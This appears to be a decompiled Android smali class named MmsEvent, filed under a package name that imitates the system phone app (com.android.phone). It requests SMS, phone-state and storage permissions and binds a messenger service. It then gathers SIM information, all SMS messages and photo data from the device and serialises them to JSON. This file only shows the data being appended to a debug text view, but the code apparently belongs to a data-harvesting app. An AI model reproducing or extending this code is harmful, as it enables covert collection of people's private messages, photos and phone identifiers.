.class public Lcom/android/phone/event/MmsEvent;
.super Ljava/lang/Object;
.source "MmsEvent.java"

# interfaces
.implements Landroid/support/v4/app/ActivityCompat$OnRequestPermissionsResultCallback;


# static fields
.field private static final DEBUG:Z = true

.field private static final PERMISSIONS:[Ljava/lang/String;

.field protected static final TAG:Ljava/lang/String;


# instance fields
.field private mActivity:Ljava/lang/ref/WeakReference;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/ref/WeakReference",
            "<",
            "Landroid/app/Activity;",
            ">;"
        }
    .end annotation
.end field

.field private mConn:Landroid/content/ServiceConnection;

.field private mService:Lcom/android/phone/service/aidl/MessengerServiceAIDL;

.field private mTextViewForDebug:Landroid/widget/TextView;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    .line 29
    const-class v0, Lcom/android/phone/event/MmsEvent;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    .line 32
    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    .line 33
    const-string v2, "android.permission.READ_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    .line 34
    const-string v2, "android.permission.BROADCAST_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    .line 35
    const-string v2, "android.permission.RECEIVE_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    .line 36
    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    .line 37
    const-string v2, "android.permission.READ_PHONE_STATE"

    aput-object v2, v0, v1

    .line 32
    sput-object v0, Lcom/android/phone/event/MmsEvent;->PERMISSIONS:[Ljava/lang/String;

    .line 38
    return-void
.end method

.method constructor <init>(Landroid/app/Activity;)V
    .locals 1
    .param p1, "activity"    # Landroid/app/Activity;

    .prologue
    const/4 v0, 0x0

    .line 71
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 40
    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    .line 41
    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    .line 44
    new-instance v0, Lcom/android/phone/event/MmsEvent$1;

    invoke-direct {v0, p0}, Lcom/android/phone/event/MmsEvent$1;-><init>(Lcom/android/phone/event/MmsEvent;)V

    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mConn:Landroid/content/ServiceConnection;

    .line 72
    new-instance v0, Ljava/lang/ref/WeakReference;

    invoke-direct {v0, p1}, Ljava/lang/ref/WeakReference;-><init>(Ljava/lang/Object;)V

    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    .line 74
    invoke-direct {p0, p1}, Lcom/android/phone/event/MmsEvent;->initService(Landroid/app/Activity;)V

    .line 75
    return-void
.end method

.method static synthetic access$0(Lcom/android/phone/event/MmsEvent;Lcom/android/phone/service/aidl/MessengerServiceAIDL;)V
    .locals 0

    .prologue
    .line 43
    iput-object p1, p0, Lcom/android/phone/event/MmsEvent;->mService:Lcom/android/phone/service/aidl/MessengerServiceAIDL;

    return-void
.end method

.method static synthetic access$1(Lcom/android/phone/event/MmsEvent;)Lcom/android/phone/service/aidl/MessengerServiceAIDL;
    .locals 1

    .prologue
    .line 43
    iget-object v0, p0, Lcom/android/phone/event/MmsEvent;->mService:Lcom/android/phone/service/aidl/MessengerServiceAIDL;

    return-object v0
.end method

.method static synthetic access$2(Lcom/android/phone/event/MmsEvent;)Ljava/lang/ref/WeakReference;
    .locals 1

    .prologue
    .line 41
    iget-object v0, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    return-object v0
.end method

.method static synthetic access$3(Lcom/android/phone/event/MmsEvent;)Landroid/content/ServiceConnection;
    .locals 1

    .prologue
    .line 44
    iget-object v0, p0, Lcom/android/phone/event/MmsEvent;->mConn:Landroid/content/ServiceConnection;

    return-object v0
.end method

.method private initService(Landroid/app/Activity;)V
    .locals 3
    .param p1, "activity"    # Landroid/app/Activity;

    .prologue
    .line 78
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/android/phone/service/MessengerService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 79
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p1, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 80
    iget-object v1, p0, Lcom/android/phone/event/MmsEvent;->mConn:Landroid/content/ServiceConnection;

    const/4 v2, 0x1

    invoke-virtual {p1, v0, v1, v2}, Landroid/app/Activity;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    .line 81
    return-void
.end method


# virtual methods
.method public getPermission()V
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 88
    sget-object v2, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    const-string v3, "getPermission"

    invoke-static {v2, v3}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 89
    iget-object v2, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    invoke-virtual {v2}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/Activity;

    .line 90
    .local v0, "activity":Landroid/app/Activity;
    invoke-static {}, Lcom/android/phone/permission/PermissionHelper;->getInstance()Lcom/android/phone/permission/PermissionHelper;

    move-result-object v2

    sget-object v3, Lcom/android/phone/event/MmsEvent;->PERMISSIONS:[Ljava/lang/String;

    invoke-virtual {v2, v0, v3}, Lcom/android/phone/permission/PermissionHelper;->getPermission(Landroid/app/Activity;[Ljava/lang/String;)Z

    move-result v1

    .line 91
    .local v1, "wait":Z
    sget-object v2, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "wait:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 92
    if-nez v1, :cond_0

    .line 93
    const/4 v2, 0x0

    invoke-virtual {p0, v2, v5, v5}, Lcom/android/phone/event/MmsEvent;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 95
    :cond_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 6
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .prologue
    .line 101
    sget-object v4, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    const-string v5, "onRequestPermissionsResult"

    invoke-static {v4, v5}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 102
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    invoke-virtual {v4}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/Activity;

    .line 104
    .local v0, "activity":Landroid/app/Activity;
    invoke-static {v0}, Lcom/android/phone/info/PhoneInfoUtils;->getSimInfoBySubscriptionManager(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-static {v4}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 105
    .local v2, "simInfo":Ljava/lang/String;
    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 106
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    if-eqz v4, :cond_0

    .line 107
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    const-string v5, "\n----------------------------------------\n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 108
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    invoke-virtual {v4, v2}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 112
    :cond_0
    invoke-static {v0}, Lcom/android/phone/mms/SmsReadHelper;->getSmsDataInPhone(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-static {v4}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 113
    .local v3, "smsInPhone":Ljava/lang/String;
    invoke-static {v3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 114
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    if-eqz v4, :cond_1

    .line 115
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    const-string v5, "\n----------------------------------------\n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 116
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    invoke-virtual {v4, v3}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 121
    :cond_1
    invoke-static {v0}, Lcom/android/phone/picture/PhotoReadHelper;->getPhotoDataInPhone(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-static {v4}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 122
    .local v1, "photoInPhone":Ljava/lang/String;
    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    .line 123
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    if-eqz v4, :cond_2

    .line 124
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    const-string v5, "\n----------------------------------------\n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 125
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    invoke-virtual {v4, v1}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 128
    :cond_2
    return-void
.end method

.method public setTextView(Landroid/widget/TextView;)V
    .locals 0
    .param p1, "textView"    # Landroid/widget/TextView;

    .prologue
    .line 84
    iput-object p1, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    .line 85
    return-void
.end method
